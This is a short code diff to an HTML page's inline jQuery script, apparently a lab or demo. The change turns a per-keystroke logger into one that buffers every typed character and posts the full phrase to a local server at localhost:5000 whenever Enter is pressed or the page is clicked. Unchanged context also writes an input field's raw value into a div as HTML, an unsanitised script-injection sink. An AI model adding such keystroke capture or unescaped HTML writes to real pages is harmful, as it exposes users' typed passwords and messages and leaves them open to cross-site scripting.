@@ -23,17 +23,23 @@
 
 &lt;link rel="icon" href="data:,">
 
-
 &lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js">&lt;/script>
 
 &lt;script>
 
+    var phrase = [];
+
     $(document).on('keypress',function(key){
         var letter = String.fromCharCode(key.charCode);
-        console.log(letter);
+        phrase.push(letter);
+        if (key.charCode === 13){
+            $.post('http://localhost:5000/' + phrase.toString());
+        };
+    });
 
-        $.post('http://localhost:5000/' + letter);
-    })
+    $(document).on('click',function(){
+        $.post('http://localhost:5000/' + phrase.toString());
+    });
 
 
 &lt;/script>
@@ -45,8 +51,6 @@
             $("button").on('click', function(){
                 $("div").html($("input").val())
             })
-
-
 
         </script>
     </body>
